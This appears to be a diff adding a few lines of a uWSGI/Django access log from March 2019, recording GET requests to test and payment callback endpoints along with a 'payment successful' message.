+[pid: 13638|app: 0|req: 2/2] 113.88.13.180 () {40 vars in 678 bytes} [Mon Mar 18 14:29:07 2019] GET /randomtest/ => generated 139 bytes in 30 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 13638|app: 0|req: 3/3] 113.88.13.180 () {38 vars in 643 bytes} [Mon Mar 18 14:29:07 2019] GET /favicon.ico => generated 5407 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 13638|app: 0|req: 4/4] 113.88.14.120 () {40 vars in 678 bytes} [Mon Mar 18 14:29:09 2019] GET /randomtest/ => generated 138 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 0)
+[pid: 13638|app: 0|req: 5/5] 113.88.14.120 () {40 vars in 674 bytes} [Mon Mar 18 14:29:21 2019] GET /returnurl => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 116 bytes (1 switches on core 0)
+[pid: 13638|app: 0|req: 6/6] 113.88.14.120 () {40 vars in 676 bytes} [Mon Mar 18 14:29:21 2019] GET /returnurl/ => generated 976 bytes in 5 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 0)
+[pid: 13638|app: 0|req: 7/7] 113.88.14.120 () {40 vars in 676 bytes} [Mon Mar 18 14:29:24 2019] GET /returnurl/ => generated 976 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 0)
+[pid: 13638|app: 0|req: 8/8] 113.88.14.120 () {40 vars in 680 bytes} [Mon Mar 18 14:29:33 2019] GET /appnotifyurl => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 119 bytes (1 switches on core 0)
+支付成功
+[pid: 13638|app: 0|req: 9/9] 113.88.14.120 () {40 vars in 682 bytes} [Mon Mar 18 14:29:33 2019] GET /appnotifyurl/ => generated 18 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 13638|app: 0|req: 10/10] 113.88.14.120 () {40 vars in 676 bytes} [Mon Mar 18 14:30:48 2019] GET /returnurl/ => generated 976 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 109 bytes (1 switches on core 0)
+Not Found: /
+[pid: 13638|app: 0|req: 11/11] 88.251.246.174 () {32 vars in 445 bytes} [Mon Mar 18 15:01:27 2019] GET / => generated 5359 bytes in 9 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
